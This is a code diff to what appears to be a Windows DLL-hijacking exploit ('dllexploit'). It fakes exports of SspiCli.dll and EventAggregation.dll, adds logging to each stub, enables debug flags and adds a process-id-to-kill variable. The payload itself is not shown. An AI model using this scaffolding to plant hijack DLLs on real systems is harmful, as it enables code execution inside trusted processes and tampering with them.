@@ -1,5 +1,4 @@
 #include "dllexploit.h"
-
 //
 // Windows 8.1 -> SspiCli.dll
 //
@@ -32,11 +31,11 @@ extern "C" __declspec(dllexport) void APIENTRY EADeleteAggregateEvent();
 
 HMODULE g_hInstance = NULL;
 HANDLE g_hConsoleOutput = NULL;
-DWORD g_dwProcessId = 0;
-LPWSTR g_pwszDumpFilePath = NULL;
 LPWSTR g_pwszGuid = NULL;
-BOOL g_bVerbose = FALSE;
-BOOL g_bDebug = FALSE;
+BOOL g_bVerbose = TRUE;
+BOOL g_bDebug = TRUE;
+LPWSTR g_pwszOption = NULL;
+DWORD g_dwPidToKill = 0;
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
@@ -69,17 +68,37 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 //
 // SspiCli.dll
 //
-void APIENTRY LogonUserExExW() { }
+void APIENTRY LogonUserExExW() {
+    LogToConsole(L"LogonUserExExW)\n");
+}
 
 //
 // EventAggregation.dll
 //
-void APIENTRY BriCreateBrokeredEvent() { }
-void APIENTRY BriDeleteBrokeredEvent() { }
-void APIENTRY EaCreateAggregatedEvent() { }
-void APIENTRY EACreateAggregateEvent() { }
-void APIENTRY EaQueryAggregatedEventParameters() { }
-void APIENTRY EAQueryAggregateEventData() { }
-void APIENTRY EaFreeAggregatedEventParameters() { }
-void APIENTRY EaDeleteAggregatedEvent() { }
-void APIENTRY EADeleteAggregateEvent() { }
+void APIENTRY BriCreateBrokeredEvent() {
+    LogToConsole(L"BriCreateBrokeredEvent\n");
+}
+void APIENTRY BriDeleteBrokeredEvent() {
+    LogToConsole(L"BriDeleteBrokeredEvent\n");
+}
+void APIENTRY EaCreateAggregatedEvent() {
+    LogToConsole(L"EaCreateAggregatedEvent\n");
+}
+void APIENTRY EACreateAggregateEvent() {
+    LogToConsole(L"EACreateAggregateEvent\n");
+}
+void APIENTRY EaQueryAggregatedEventParameters() {
+    LogToConsole(L"EaQueryAggregatedEventParameters\n");
+}
+void APIENTRY EAQueryAggregateEventData() {
+    LogToConsole(L"EAQueryAggregateEventData\n");
+}
+void APIENTRY EaFreeAggregatedEventParameters() {
+    LogToConsole(L"EaFreeAggregatedEventParameters\n");
+}
+void APIENTRY EaDeleteAggregatedEvent() {
+    LogToConsole(L"EaDeleteAggregatedEvent\n");
+}
+void APIENTRY EADeleteAggregateEvent() {
+    LogToConsole(L"EADeleteAggregateEvent\n");
+}
